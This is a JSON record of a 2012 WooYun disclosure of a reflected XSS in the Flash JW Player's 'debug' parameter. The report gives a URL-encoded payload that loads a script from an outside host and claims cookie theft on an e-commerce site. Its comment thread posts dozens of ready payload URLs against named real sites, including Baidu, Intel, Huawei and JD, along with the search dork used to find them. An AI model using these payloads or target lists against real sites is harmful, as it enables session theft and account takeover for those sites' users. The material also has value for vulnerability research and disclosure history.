{"id": 20271, "wybug_id": "wooyun-2012-07166", "wybug_title": "JWPlayer Xss 0day [Flash编程安全问题]", "wybug_corp": "LongTail Video", "wybug_author": "gainover", "wybug_date": "2012-05-15 23:35", "wybug_open_date": "2012-05-15 23:35", "wybug_type": "xss跨站脚本攻击", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "未联系到厂商或者厂商积极忽略", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["第三方不可信程序", "反射型", "安全", "应用安全", "利用"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2012-05-15：\t积极联系厂商并且等待厂商认领中，细节不对外公开\t\t\t\t\t\t\t\t\t2012-05-15：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： 国外的一款播放器，使用网站数量超过百万，官方介绍：“LongTail Video is a New York-based startup that has pioneered the web video market. Our flagship product the - JW Player - is active on over one million websites and streams billions of videos each month.”该FLASH版本视频播放器代码编写上存在一处安全问题，利用之前我所用到的技巧，可以进行跨站攻击。它自己主站跨站到无所谓啦，但是用到这个播放器的其它网站就难说了。 比如中国的“去哪儿” ，美国的某某某某站。。  详细说明：  A Xss vulnerability in JWPlayerTest Browser: IE , Firefox.Test Platform: Win 7.1. The Bug code in package com.longtailvideo.jwplayer.utilsclass Loggerprivate static function send(_arg1:String):voidif (ExternalInterface.available){      ExternalInterface.call(_config.debug, text);<---directly use _config.debug};2. The _config.debug is directly used as the first parameter of ExternalInterface.call. And the _config is loaded from loaderInfo.parameters. Therefore, when we construct a link such as \" jwplayer.swf?debug=(function(){alert('xxx')})() \", the passed-in javascript code will be run.3. Then we can use the trick   location.href='javascript:\"<script src={js file url}></script>\"'   to load and run external javascript file.Test encoded evil code:\nhttp://player.longtailvideo.com/player.swf?debug=(function()%7Blocation.href%3D'javascript%3A%22%3Cscript%2Fsrc%3D%5C'%2F%2Fappmaker.sinaapp.com%5C%2Ftest5.js%5C'%3E%3C%2Fscript%3E%22'%7D)\n4. That's all   漏洞证明：  1. Simple Alert\n\n2. Stolen Cookies in a chinese e-commerce website. \n\n   修复方案：  Limit the length of \"debug\" parameters and check its content.   版权声明：转载请注明来源 gainover@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 未能联系到厂商或者厂商积极拒绝 漏洞Rank：5 (WooYun评价)  ", "replys": "漏洞评价：\n评论\n     2012-05-15 23:40 |    \t\timlonghao \t\t\t( 普通白帽子  |\t\t\t        Rank:730 漏洞数:74        )\t\t \n  跨站师，去把各大视频网站扫荡一遍吧！    \n     2012-05-15 23:47 |    \t\tgainover  \t\t\t( 核心白帽子 |\t\t\t        Rank:1710 漏洞数:93        | PKAV技术宅社区! -- gainover| 工具猫网络-...)\t\t \n  @去哪儿 关于这个播放器的，俺也不单独发了。。  http://tuan.qunar.com/static/img/player.swf?debug=(function()%7Blocation.href%3D'javascript%3A%22%3Cscript%2Fsrc%3D%5C'%2F%2Fappmaker.sinaapp.com%5C%2Ftest5.js%5C'%3E%3C%2Fscript%3E%22'%7D%29    \n     2012-05-16 00:24 |    \t\tgainover  \t\t\t( 核心白帽子 |\t\t\t        Rank:1710 漏洞数:93        | PKAV技术宅社区! -- gainover| 工具猫网络-...)\t\t \n  @Intel  http://www.intel.com/about/companyinfo/healthcare/products/reader/swf/player.swf?debug=(function()%7Blocation.href%3D'javascript%3A%22%3Cscript%2Fsrc%3D%5C'%2F%2Fappmaker.sinaapp.com%5C%2Ftest5.js%5C'%3E%3C%2Fscript%3E%22'%7D%29     \n     2012-05-16 00:31 |    \t\tgainover  \t\t\t( 核心白帽子 |\t\t\t        Rank:1710 漏洞数:93        | PKAV技术宅社区! -- gainover| 工具猫网络-...)\t\t \n  @百度 http://youxi.baidu.com/media/player.swf?debug=function(){alert(/xxx/)}  貌似服务器那边过滤了' 利用代码上需要稍微变通    \n     2012-05-16 00:34 |    \t\tgainover  \t\t\t( 核心白帽子 |\t\t\t        Rank:1710 漏洞数:93        | PKAV技术宅社区! -- gainover| 工具猫网络-...)\t\t \n  @AT&T  http://pte.att.com/player.swf?debug=alert    \n     2012-05-16 00:36 |    \t\tgainover  \t\t\t( 核心白帽子 |\t\t\t        Rank:1710 漏洞数:93        | PKAV技术宅社区! -- gainover| 工具猫网络-...)\t\t \n  @百度 http://www.baidu.com/search/zhidao/badminton/jwplayer/player.swf?debug=alert 主域名的    \n     2012-05-16 00:37 |    \t\tgainover  \t\t\t( 核心白帽子 |\t\t\t        Rank:1710 漏洞数:93        | PKAV技术宅社区! -- gainover| 工具猫网络-...)\t\t \n  @百度 http://ued.baidu.com/wp-content/plugins/flash-video-player/mediaplayer/player.swf?debug=alert  百度UED，看来很多装了WP的都用了这个插件。     \n     2012-05-16 00:38 |    \t\tgainover  \t\t\t( 核心白帽子 |\t\t\t        Rank:1710 漏洞数:93        | PKAV技术宅社区! -- gainover| 工具猫网络-...)\t\t \n  @百度 http://sem.baidu.com/jw_player/player.swf?debug=alert     \n     2012-05-16 00:39 |    \t\t蟋蟀哥哥 \t\t\t( 普通白帽子  |\t\t\t        Rank:363 漏洞数:57        | 巴蜀人士,80后宅男,自学成才,天朝教育失败...)\t\t \n  @gainover 你妹。。你怎么搜索的。。我怎么没找到这么多    \n     2012-05-16 00:44 |    \t\tgainover  \t\t\t( 核心白帽子 |\t\t\t        Rank:1710 漏洞数:93        | PKAV技术宅社区! -- gainover| 工具猫网络-...)\t\t \n  @蟋蟀哥哥 = = GOOGLE inurl:(player.swf) 其它的你懂的。。    \n     2012-05-16 00:44 |    \t\tgainover  \t\t\t( 核心白帽子 |\t\t\t        Rank:1710 漏洞数:93        | PKAV技术宅社区! -- gainover| 工具猫网络-...)\t\t \n  @新浪 http://nokia.sina.com.cn/n8/player/player.swf?debug=alert    \n     2012-05-16 00:48 |    \t\t蟋蟀哥哥 \t\t\t( 普通白帽子  |\t\t\t        Rank:363 漏洞数:57        | 巴蜀人士,80后宅男,自学成才,天朝教育失败...)\t\t \n  @gainover 别爆了，留着刷分。。。    \n     2012-05-16 00:53 |    \t\tgainover  \t\t\t( 核心白帽子 |\t\t\t        Rank:1710 漏洞数:93        | PKAV技术宅社区! -- gainover| 工具猫网络-...)\t\t \n  @蟋蟀哥哥 = = 这些都给厂商算了，反正我也没用的到的地方。。 这文章已经公开了，被别人拿去做坏事了也不太好，先把大站好找的找了先咯。。     \n     2012-05-16 00:53 |    \t\t蟋蟀哥哥 \t\t\t( 普通白帽子  |\t\t\t        Rank:363 漏洞数:57        | 巴蜀人士,80后宅男,自学成才,天朝教育失败...)\t\t \n  @gainover 哈哈。。    \n     2012-05-16 01:09 |    \t\tgainover  \t\t\t( 核心白帽子 |\t\t\t        Rank:1710 漏洞数:93        | PKAV技术宅社区! -- gainover| 工具猫网络-...)\t\t \n  @猫扑  http://yximg.mop.com/minisite/201007/baodaopage/Scripts/player.swf?debug=alert    \n     2012-05-16 01:10 |    \t\tgainover  \t\t\t( 核心白帽子 |\t\t\t        Rank:1710 漏洞数:93        | PKAV技术宅社区! -- gainover| 工具猫网络-...)\t\t \n  @猫扑 http://yximg.mop.com/minisite/200911/jilie/Scripts/player.swf?debug=alert    \n     2012-05-16 02:08 |    \t\tgainover  \t\t\t( 核心白帽子 |\t\t\t        Rank:1710 漏洞数:93        | PKAV技术宅社区! -- gainover| 工具猫网络-...)\t\t \n  @中国网络电视台  http://t.live.cntv.cn/oceantest/player.swf?debug=alert    \n     2012-05-16 02:12 |    \t\tgainover  \t\t\t( 核心白帽子 |\t\t\t        Rank:1710 漏洞数:93        | PKAV技术宅社区! -- gainover| 工具猫网络-...)\t\t \n  @走秀网  http://tuan.xiu.com/static/theme/YellowUMZZ/img/player.swf?debug=alert    \n     2012-05-16 02:13 |    \t\tgainover  \t\t\t( 核心白帽子 |\t\t\t        Rank:1710 漏洞数:93        | PKAV技术宅社区! -- gainover| 工具猫网络-...)\t\t \n  @百合网 http://images.baihe.com/images/landingpage/images/video/player.swf?debug=alert  = = 感觉每个站都在用这个播放器    \n     2012-05-16 02:17 |    \t\tgainover  \t\t\t( 核心白帽子 |\t\t\t        Rank:1710 漏洞数:93        | PKAV技术宅社区! -- gainover| 工具猫网络-...)\t\t \n  @百合网  http://act.baihe.com/event/1104lovevideo/player.swf?debug=alerthttp://story.baihe.com/player.swf?debug=alerthttp://act.baihe.com/event/1009zhidao/player.swf?debug=alerthttp://act.baihe.com/event/1026zhidao/player.swf?debug=alert另外 act.baihe.com 与 story.baihe.com , images.baihe.com 全部都存在apache http-only cookies 泄漏漏洞。     \n     2012-05-16 02:19 |    \t\ttestcvc \t\t\t( 路人 |\t\t\t        Rank:5 漏洞数:1        | test)\t\t \n  @gainover 大站都快被你爆完了    \n     2012-05-16 02:21 |    \t\tzeracker  \t\t\t( 核心白帽子 |\t\t\t        Rank:1068 漏洞数:137        | 多乌云、多机会!微信公众号: id:a301zls   ...)\t\t \n  我嘞个去。灾难来了。。。。    \n     2012-05-16 02:21 |    \t\tgainover  \t\t\t( 核心白帽子 |\t\t\t        Rank:1710 漏洞数:93        | PKAV技术宅社区! -- gainover| 工具猫网络-...)\t\t \n  @诺基亚 http://blog.maps.nokia.com/wp-content/plugins/vipers-video-quicktags/resources/jw-flv-player/player.swf?debug=alert    \n     2012-05-16 02:24 |    \t\tzeracker  \t\t\t( 核心白帽子 |\t\t\t        Rank:1068 漏洞数:137        | 多乌云、多机会!微信公众号: id:a301zls   ...)\t\t \n  @gainover .....................................这个cncert应该要预警了吧？@cncert国家互联网应急中心 呼叫，呼叫    \n     2012-05-16 02:28 |    \t\tgainover  \t\t\t( 核心白帽子 |\t\t\t        Rank:1710 漏洞数:93        | PKAV技术宅社区! -- gainover| 工具猫网络-...)\t\t \n  @zeracker = = 不晓得， 反正国内用这个程序的不在少数。 腾讯啥的也有用，不过他们用的是旧版的。。4.1的。 感觉其实这个可以交给 cncert 处理的。    \n     2012-05-16 02:40 |    \t\t小禾吉 \t\t\t( 路人 |\t\t\t        Rank:0 漏洞数:1        | 宇宙的目的很可能和人类没有关系，宇宙很可...)\t\t \n  这个很霸气~    \n     2012-05-16 02:45 |    \t\tgainover  \t\t\t( 核心白帽子 |\t\t\t        Rank:1710 漏洞数:93        | PKAV技术宅社区! -- gainover| 工具猫网络-...)\t\t \n  @京东商城 http://market.360buy.com/zhuanmai/ECOVACS/player.swf?debug=alert    \n     2012-05-16 02:47 |    \t\tgainover  \t\t\t( 核心白帽子 |\t\t\t        Rank:1710 漏洞数:93        | PKAV技术宅社区! -- gainover| 工具猫网络-...)\t\t \n  @华为 http://ipv6.huawei.com/en/ucmf/groups/public/documents/webasset/player.swf?debug=alert    \n     2012-05-16 02:51 |    \t\tgainover  \t\t\t( 核心白帽子 |\t\t\t        Rank:1710 漏洞数:93        | PKAV技术宅社区! -- gainover| 工具猫网络-...)\t\t \n  @华为技术有限公司 好像挺多。。http://ipv6.huawei.com/en/ucmf/groups/public/documents/webasset/player.swf?debug=alerthttp://www-hk.huawei.com/cn/ucmf/groups/public/documents/webasset/player.swfhttp://ipv6.huawei.com/cn/ucmf/groups/public/documents/webasset/player.swfhttp://www.huawei.com/minisite/mwc2012/cn/js/player.swfhttp://www.huawei.com/za/ucmf/groups/public/documents/webasset/player.swf以下省略若干个    \n     2012-05-16 02:52 |    \t\tgainover  \t\t\t( 核心白帽子 |\t\t\t        Rank:1710 漏洞数:93        | PKAV技术宅社区! -- gainover| 工具猫网络-...)\t\t \n  @4399小游戏  http://news.4399.com/tnt/images/player.swf?debug=alert    \n     2012-05-16 02:54 |    \t\tgainover  \t\t\t( 核心白帽子 |\t\t\t        Rank:1710 漏洞数:93        | PKAV技术宅社区! -- gainover| 工具猫网络-...)\t\t \n  @4399小游戏 http://news.4399.com/dnf/flash/player.swf  DNF。。。 不会每个游戏目录下都有一个吧！！    \n     2012-05-16 03:00 |    \t\tgainover  \t\t\t( 核心白帽子 |\t\t\t        Rank:1710 漏洞数:93        | PKAV技术宅社区! -- gainover| 工具猫网络-...)\t\t \n  @盛大在线 http://qn.sdo.com/web1/swf/player.swfhttp://qn.sdo.com/web/swf/player.swfhttp://media.static.sdo.com/ac/ac/project/acguide/flash/player.swf?debug=alert    \n     2012-05-16 03:02 |    \t\tgainover  \t\t\t( 核心白帽子 |\t\t\t        Rank:1710 漏洞数:93        | PKAV技术宅社区! -- gainover| 工具猫网络-...)\t\t \n  @凤凰网  http://sn.ifeng.com/guowenwangzhan/greensn/video/player.swf?debug=alert    \n     2012-05-16 03:05 |    \t\tgainover  \t\t\t( 核心白帽子 |\t\t\t        Rank:1710 漏洞数:93        | PKAV技术宅社区! -- gainover| 工具猫网络-...)\t\t \n  @久游网 http://dl-hb.9you.com/play/Player.swf?debug=alert    \n     2012-05-16 03:13 |    \t\t小博 \t\t\t( 路人 |\t\t\t        Rank:6 漏洞数:4        | 一个关注与信息安全 程序开发的IT程序员)\t\t \n  别爆了    \n     2012-05-16 03:20 |    \t\tgainover  \t\t\t( 核心白帽子 |\t\t\t        Rank:1710 漏洞数:93        | PKAV技术宅社区! -- gainover| 工具猫网络-...)\t\t \n  @小博 没的爆了，差不多就这么些吧～～ 肯定还有一些是改过名字，不叫player.swf 的～～ 得换个方法搜索了    \n     2012-05-16 03:33 |    \t\tgainover  \t\t\t( 核心白帽子 |\t\t\t        Rank:1710 漏洞数:93        | PKAV技术宅社区! -- gainover| 工具猫网络-...)\t\t \n  试了下，果然有不叫player.swf的比如新浪的@新浪http://all.vic.sina.com.cn/listerine21days/flash/player/player-viral.swf    \n     2012-05-16 03:35 |    \t\t小博 \t\t\t( 路人 |\t\t\t        Rank:6 漏洞数:4        | 一个关注与信息安全 程序开发的IT程序员)\t\t \n  @gainover 好的 还有发现的么 我去提交个 看能不能换个新浪的礼物    \n     2012-05-16 05:58 |    \t\tyingzi \t\t\t( 实习白帽子  |\t\t\t        Rank:38 漏洞数:3        )\t\t \n  关注中    \n     2012-05-16 05:58 |    \t\timlonghao \t\t\t( 普通白帽子  |\t\t\t        Rank:730 漏洞数:74        )\t\t \n  @cncert国家互联网应急中心 有预警这东西么？    \n     2012-05-16 08:05 |    \t\tHxai11 \t\t\t( 普通白帽子  |\t\t\t        Rank:1137 漏洞数:218        | 于是我们奋力向前游，逆流而上的小舟，不停...)\t\t \n  危险系数很高！！    \n     2012-05-16 08:59 |    \t\twanglaojiu \t\t\t( 普通白帽子  |\t\t\t        Rank:168 漏洞数:39        | 道生一，一生二，二生三，三生万物，万物负...)\t\t \n  这么危险的东西，看来好多网站限制使用swf还是有先见之明的。    \n     2012-05-16 09:34 |    \t\t123 \t\t\t( 路人 |\t\t\t        Rank:27 漏洞数:3        | 123)\t\t \n  帅气，我先把我的换掉    \n     2012-05-16 09:45 |    \t\tufohacker \t\t\t( 路人 |\t\t\t        Rank:3 漏洞数:1        | 提高的是能力不是技术！)\t\t \n  求一次完整的攻击实例。    \n     2012-05-16 10:12 |    \t\twanglaojiu \t\t\t( 普通白帽子  |\t\t\t        Rank:168 漏洞数:39        | 道生一，一生二，二生三，三生万物，万物负...)\t\t \n  我了个去，试了下基本都是国内的弹框，国外的还没找到个能弹的，难道是后门......同志还需努力啊，代码还是自己敲的好，拷贝来拷贝去的终归不是长久之计。    \n     2012-05-16 10:29 |    \t\tPower \t\t\t( 实习白帽子  |\t\t\t        Rank:54 漏洞数:22        | 还需要等待.........)\t\t \n  太牛逼了.........    \n     2012-05-16 10:40 |    \t\thellok \t\t\t( 普通白帽子  |\t\t\t        Rank:123 漏洞数:10        | 酱油党路过)\t\t \n  cool~    \n     2012-05-16 10:51 |    \t\thorseluke \t\t\t( 普通白帽子  |\t\t\t        Rank:116 漏洞数:18        | Realize the dream in earnest.)\t\t \n  JWPlayer的使用量已经达到类似于框架使用的范围，所以出问题这么多也不奇怪。    \n     2012-05-16 11:10 |    \t\tLee \t\t\t( 普通白帽子  |\t\t\t        Rank:113 漏洞数:24        | wataru@eviloctal.com)\t\t \n  good！     \n     2012-05-16 11:41 |    \t\tp.z  \t\t\t( 普通白帽子  |\t\t\t        Rank:411 漏洞数:40        )\t\t \n  威武！求共享命令行下反编译工具！！！    \n     2012-05-16 12:13 |    \t\tgainover  \t\t\t( 核心白帽子 |\t\t\t        Rank:1710 漏洞数:93        | PKAV技术宅社区! -- gainover| 工具猫网络-...)\t\t \n  @p.z = = 哭一个，我没找到。。 swftools里没有把swf转as的。。 就只看到一个在线转换的 swf2as （真想搞到源码）。  不过ASV有批量的功能。    \n     2012-05-16 16:34 |    \t\tValo洛洛 \t\t\t( 普通白帽子  |\t\t\t        Rank:458 漏洞数:52        | 。)\t\t \n  牛逼了 我去    \n     2012-05-17 16:30 |    \t\t小龙女 \t\t\t( 路人 |\t\t\t        Rank:3 漏洞数:2        | venus)\t\t \n  super ,ps,为啥我是见习白帽子    \n     2012-05-17 22:51 |    \t\t肥田鸡 \t\t\t( 路人 |\t\t\t        Rank:13 漏洞数:2        | 今天的最好表现是明天的最低要求)\t\t \n  nice!    \n     2012-05-18 07:48 |    \t\tHxai11 \t\t\t( 普通白帽子  |\t\t\t        Rank:1137 漏洞数:218        | 于是我们奋力向前游，逆流而上的小舟，不停...)\t\t \n  @小龙女 哈哈，现在wooyun等级制度了    \n     2012-09-25 12:05 |    \t\t神刀 \t\t\t( 路人 |\t\t\t        Rank:23 漏洞数:3        | www.shellsec.com内射那么牛，虾米没妹子？)\t\t \n  好HI    \n  \n\n\n", "wybug_level_fromcorp": "未能联系到厂商或者厂商积极拒绝", "wybug_rank_fromcorp": 5, "Ranks": null}